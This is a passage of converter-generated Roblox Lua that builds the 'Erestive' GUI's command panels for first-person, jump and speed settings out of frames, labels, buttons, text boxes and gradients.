G2L["114"]["Position"] = UDim2.new(0, 0, 0.14243, 0);
G2L["114"]["Name"] = [[night]];
G2L["114"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.Text
G2L["115"] = Instance.new("TextLabel", G2L["114"]);
G2L["115"]["TextWrapped"] = true;
G2L["115"]["ZIndex"] = 9;
G2L["115"]["TextSize"] = 14;
G2L["115"]["TextScaled"] = true;
G2L["115"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["115"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["115"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["115"]["BackgroundTransparency"] = 1;
G2L["115"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["115"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["115"]["Text"] = [[FirstPerson]];
G2L["115"]["Name"] = [[Text]];
G2L["115"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar
G2L["116"] = Instance.new("Frame", G2L["114"]);
G2L["116"]["BorderSizePixel"] = 0;
G2L["116"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["116"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["116"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["116"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["116"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.WhiteBar.UIGradient
G2L["117"] = Instance.new("UIGradient", G2L["116"]);
G2L["117"]["Rotation"] = 90;
G2L["117"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UICorner
G2L["118"] = Instance.new("UICorner", G2L["114"]);
G2L["118"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig
G2L["119"] = Instance.new("Frame", G2L["114"]);
G2L["119"]["BorderSizePixel"] = 0;
G2L["119"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["119"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["119"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["119"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UICorner
G2L["11a"] = Instance.new("UICorner", G2L["119"]);
G2L["11a"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["11b"] = Instance.new("Frame", G2L["119"]);
G2L["11b"]["ZIndex"] = 2;
G2L["11b"]["BorderSizePixel"] = 0;
G2L["11b"]["BackgroundColor3"] = Color3.fromRGB(0, 43, 6);
G2L["11b"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["11b"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["11b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["11b"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["11c"] = Instance.new("LocalScript", G2L["11b"]);
G2L["11c"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["11d"] = Instance.new("ImageLabel", G2L["11c"]);
G2L["11d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11d"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["11d"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["11d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["11d"]["BackgroundTransparency"] = 1;
G2L["11d"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["11e"] = Instance.new("UICorner", G2L["11b"]);
G2L["11e"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["11f"] = Instance.new("TextButton", G2L["11b"]);
G2L["11f"]["TextWrapped"] = true;
G2L["11f"]["TextSize"] = 14;
G2L["11f"]["TextScaled"] = true;
G2L["11f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["11f"]["BackgroundTransparency"] = 1;
G2L["11f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["11f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["11f"]["Text"] = [[ ]];
G2L["11f"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["120"] = Instance.new("LocalScript", G2L["11f"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["121"] = Instance.new("TextLabel", G2L["11b"]);
G2L["121"]["TextWrapped"] = true;
G2L["121"]["ZIndex"] = 9;
G2L["121"]["TextSize"] = 14;
G2L["121"]["TextScaled"] = true;
G2L["121"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["121"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["121"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["121"]["BackgroundTransparency"] = 1;
G2L["121"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["121"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["121"]["Text"] = [[Visible]];
G2L["121"]["Name"] = [[Text]];
G2L["121"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["122"] = Instance.new("UIGradient", G2L["11b"]);
G2L["122"]["Rotation"] = -90;
G2L["122"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.FOVSet
G2L["123"] = Instance.new("TextBox", G2L["119"]);
G2L["123"]["Visible"] = false;
G2L["123"]["Name"] = [[FOVSet]];
G2L["123"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["123"]["TextWrapped"] = true;
G2L["123"]["TextSize"] = 14;
G2L["123"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["123"]["TextScaled"] = true;
G2L["123"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["123"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["123"]["PlaceholderText"] = [[16 - classic]];
G2L["123"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["123"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["123"]["Text"] = [[]];
G2L["123"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.UIListLayout
G2L["124"] = Instance.new("UIListLayout", G2L["119"]);
G2L["124"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["124"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable
G2L["125"] = Instance.new("Frame", G2L["119"]);
G2L["125"]["ZIndex"] = 2;
G2L["125"]["BorderSizePixel"] = 0;
G2L["125"]["BackgroundColor3"] = Color3.fromRGB(43, 0, 0);
G2L["125"]["Size"] = UDim2.new(0, 45, 0, 36);
G2L["125"]["Position"] = UDim2.new(0.50773, 0, -0, 0);
G2L["125"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["125"]["Name"] = [[VisiblEnable]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations
G2L["126"] = Instance.new("LocalScript", G2L["125"]);
G2L["126"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Animations.Sample
G2L["127"] = Instance.new("ImageLabel", G2L["126"]);
G2L["127"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["127"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["127"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["127"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["127"]["BackgroundTransparency"] = 1;
G2L["127"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UICorner
G2L["128"] = Instance.new("UICorner", G2L["125"]);
G2L["128"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button
G2L["129"] = Instance.new("TextButton", G2L["125"]);
G2L["129"]["TextWrapped"] = true;
G2L["129"]["TextSize"] = 14;
G2L["129"]["TextScaled"] = true;
G2L["129"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["129"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["129"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["129"]["BackgroundTransparency"] = 1;
G2L["129"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["129"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["129"]["Text"] = [[ ]];
G2L["129"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Button.LocalScript
G2L["12a"] = Instance.new("LocalScript", G2L["129"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.Text
G2L["12b"] = Instance.new("TextLabel", G2L["125"]);
G2L["12b"]["TextWrapped"] = true;
G2L["12b"]["ZIndex"] = 9;
G2L["12b"]["TextSize"] = 14;
G2L["12b"]["TextScaled"] = true;
G2L["12b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["12b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12b"]["BackgroundTransparency"] = 1;
G2L["12b"]["Size"] = UDim2.new(0.71736, 0, 0.54155, 0);
G2L["12b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["12b"]["Text"] = [[Visible]];
G2L["12b"]["Name"] = [[Text]];
G2L["12b"]["Position"] = UDim2.new(0.14025, 0, 0.22473, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.FOVConfig.VisiblEnable.UIGradient
G2L["12c"] = Instance.new("UIGradient", G2L["125"]);
G2L["12c"]["Rotation"] = -90;
G2L["12c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Frame.night.UIGradient
G2L["12d"] = Instance.new("UIGradient", G2L["114"]);
G2L["12d"]["Rotation"] = -90;
G2L["12d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump
G2L["12e"] = Instance.new("Frame", G2L["a7"]);
G2L["12e"]["BorderSizePixel"] = 0;
G2L["12e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12e"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["12e"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["12e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12e"]["Name"] = [[Jump]];
G2L["12e"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV
G2L["12f"] = Instance.new("Frame", G2L["12e"]);
G2L["12f"]["BorderSizePixel"] = 0;
G2L["12f"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["12f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["12f"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["12f"]["Name"] = [[FOV]];
G2L["12f"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.Text
G2L["130"] = Instance.new("TextLabel", G2L["12f"]);
G2L["130"]["TextWrapped"] = true;
G2L["130"]["ZIndex"] = 9;
G2L["130"]["TextSize"] = 14;
G2L["130"]["TextScaled"] = true;
G2L["130"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["130"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["130"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["130"]["BackgroundTransparency"] = 1;
G2L["130"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["130"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["130"]["Text"] = [[Jump]];
G2L["130"]["Name"] = [[Text]];
G2L["130"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.WhiteBar
G2L["131"] = Instance.new("Frame", G2L["12f"]);
G2L["131"]["BorderSizePixel"] = 0;
G2L["131"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["131"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["131"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["131"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["131"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.WhiteBar.UIGradient
G2L["132"] = Instance.new("UIGradient", G2L["131"]);
G2L["132"]["Rotation"] = 90;
G2L["132"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.UICorner
G2L["133"] = Instance.new("UICorner", G2L["12f"]);
G2L["133"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig
G2L["134"] = Instance.new("Frame", G2L["12f"]);
G2L["134"]["BorderSizePixel"] = 0;
G2L["134"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["134"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["134"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["134"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.UICorner
G2L["135"] = Instance.new("UICorner", G2L["134"]);
G2L["135"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV
G2L["136"] = Instance.new("Frame", G2L["134"]);
G2L["136"]["ZIndex"] = 2;
G2L["136"]["BorderSizePixel"] = 0;
G2L["136"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["136"]["Size"] = UDim2.new(0.72631, 0, 0.36356, 0);
G2L["136"]["Position"] = UDim2.new(-0.27508, 0, 1.21908, 0);
G2L["136"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["136"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.Animations
G2L["137"] = Instance.new("LocalScript", G2L["136"]);
G2L["137"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["138"] = Instance.new("ImageLabel", G2L["137"]);
G2L["138"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["138"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["138"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["138"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["138"]["BackgroundTransparency"] = 1;
G2L["138"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.UICorner
G2L["139"] = Instance.new("UICorner", G2L["136"]);
G2L["139"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.Button
G2L["13a"] = Instance.new("TextButton", G2L["136"]);
G2L["13a"]["TextWrapped"] = true;
G2L["13a"]["TextSize"] = 14;
G2L["13a"]["TextScaled"] = true;
G2L["13a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["13a"]["BackgroundTransparency"] = 1;
G2L["13a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["13a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["13a"]["Text"] = [[ ]];
G2L["13a"]["Name"] = [[Button]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.Button.LocalScript
G2L["13b"] = Instance.new("LocalScript", G2L["13a"]);



-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.Button.Animations
G2L["13c"] = Instance.new("LocalScript", G2L["13a"]);
G2L["13c"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.Text
G2L["13d"] = Instance.new("TextLabel", G2L["136"]);
G2L["13d"]["TextWrapped"] = true;
G2L["13d"]["ZIndex"] = 9;
G2L["13d"]["TextSize"] = 14;
G2L["13d"]["TextScaled"] = true;
G2L["13d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["13d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13d"]["BackgroundTransparency"] = 1;
G2L["13d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["13d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["13d"]["Text"] = [[Set Jump]];
G2L["13d"]["Name"] = [[Text]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.SetFOV.UIGradient
G2L["13e"] = Instance.new("UIGradient", G2L["136"]);
G2L["13e"]["Rotation"] = -90;
G2L["13e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.FOVConfig.FOVSet
G2L["13f"] = Instance.new("TextBox", G2L["134"]);
G2L["13f"]["Name"] = [[FOVSet]];
G2L["13f"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["13f"]["TextWrapped"] = true;
G2L["13f"]["TextSize"] = 14;
G2L["13f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13f"]["TextScaled"] = true;
G2L["13f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["13f"]["PlaceholderText"] = [[50 - classic]];
G2L["13f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["13f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["13f"]["Text"] = [[]];
G2L["13f"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.FOV.UIGradient
G2L["140"] = Instance.new("UIGradient", G2L["12f"]);
G2L["140"]["Rotation"] = -90;
G2L["140"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(208, 208, 208)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Jump.UIListLayout
G2L["141"] = Instance.new("UIListLayout", G2L["12e"]);
G2L["141"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed
G2L["142"] = Instance.new("Frame", G2L["a7"]);
G2L["142"]["BorderSizePixel"] = 0;
G2L["142"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["142"]["Size"] = UDim2.new(0, 333, 0, 100);
G2L["142"]["Position"] = UDim2.new(0, 0, 0.30916, 0);
G2L["142"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["142"]["Name"] = [[Speed]];
G2L["142"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.UIListLayout
G2L["143"] = Instance.new("UIListLayout", G2L["142"]);
G2L["143"]["Padding"] = UDim.new(0, 10);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV
G2L["144"] = Instance.new("Frame", G2L["142"]);
G2L["144"]["BorderSizePixel"] = 0;
G2L["144"]["BackgroundColor3"] = Color3.fromRGB(41, 41, 41);
G2L["144"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["144"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["144"]["Name"] = [[FOV]];
G2L["144"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.Text
G2L["145"] = Instance.new("TextLabel", G2L["144"]);
G2L["145"]["TextWrapped"] = true;
G2L["145"]["ZIndex"] = 9;
G2L["145"]["TextSize"] = 14;
G2L["145"]["TextScaled"] = true;
G2L["145"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["145"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["145"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["145"]["BackgroundTransparency"] = 1;
G2L["145"]["Size"] = UDim2.new(0.34652, 0, 0.5158, 0);
G2L["145"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["145"]["Text"] = [[Speed]];
G2L["145"]["Name"] = [[Text]];
G2L["145"]["Position"] = UDim2.new(0.03554, 0, 0.23836, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.WhiteBar
G2L["146"] = Instance.new("Frame", G2L["144"]);
G2L["146"]["BorderSizePixel"] = 0;
G2L["146"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["146"]["Size"] = UDim2.new(0.00544, 0, 0.70581, 0);
G2L["146"]["Position"] = UDim2.new(0.39047, 0, 0.14243, 0);
G2L["146"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["146"]["Name"] = [[WhiteBar]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.WhiteBar.UIGradient
G2L["147"] = Instance.new("UIGradient", G2L["146"]);
G2L["147"]["Rotation"] = 90;
G2L["147"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(0.200, 0),NumberSequenceKeypoint.new(0.800, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.UICorner
G2L["148"] = Instance.new("UICorner", G2L["144"]);
G2L["148"]["CornerRadius"] = UDim.new(0.2, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig
G2L["149"] = Instance.new("Frame", G2L["144"]);
G2L["149"]["BorderSizePixel"] = 0;
G2L["149"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["149"]["Size"] = UDim2.new(0.5183, 0, 0.81331, 0);
G2L["149"]["Position"] = UDim2.new(0.45456, 0, 0.09064, 0);
G2L["149"]["Name"] = [[FOVConfig]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.UICorner
G2L["14a"] = Instance.new("UICorner", G2L["149"]);
G2L["14a"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.FOVSet
G2L["14b"] = Instance.new("TextBox", G2L["149"]);
G2L["14b"]["Name"] = [[FOVSet]];
G2L["14b"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["14b"]["TextWrapped"] = true;
G2L["14b"]["TextSize"] = 14;
G2L["14b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14b"]["TextScaled"] = true;
G2L["14b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["14b"]["ClearTextOnFocus"] = false;
G2L["14b"]["PlaceholderText"] = [[16 - classic]];
G2L["14b"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["14b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["14b"]["Text"] = [[16]];
G2L["14b"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV
G2L["14c"] = Instance.new("Frame", G2L["149"]);
G2L["14c"]["ZIndex"] = 2;
G2L["14c"]["BorderSizePixel"] = 0;
G2L["14c"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
G2L["14c"]["Size"] = UDim2.new(1.68032, 0, 0.36356, 0);
G2L["14c"]["Position"] = UDim2.new(-0.76654, 0, 1.31329, 0);
G2L["14c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["14c"]["Name"] = [[SetFOV]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.Animations
G2L["14d"] = Instance.new("LocalScript", G2L["14c"]);
G2L["14d"]["Name"] = [[Animations]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.Animations.Sample
G2L["14e"] = Instance.new("ImageLabel", G2L["14d"]);
G2L["14e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14e"]["ImageTransparency"] = 0.6;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["14e"]["Image"] = [[http://www.roblox.com/asset/?id=4560909609]];
G2L["14e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["14e"]["BackgroundTransparency"] = 1;
G2L["14e"]["Name"] = [[Sample]];


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.UICorner
G2L["14f"] = Instance.new("UICorner", G2L["14c"]);
G2L["14f"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Erestive.MainFrame.CommandFrame.Frame1.Speed.FOV.FOVConfig.SetFOV.Button
G2L["150"] = Instance.new("TextButton", G2L["14c"]);
G2L["150"]["TextWrapped"] = true;
G2L["150"]["TextSize"] = 14;
G2L["150"]["TextScaled"] = true;
G2L["150"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["150"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["150"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["150"]["BackgroundTransparency"] = 1;
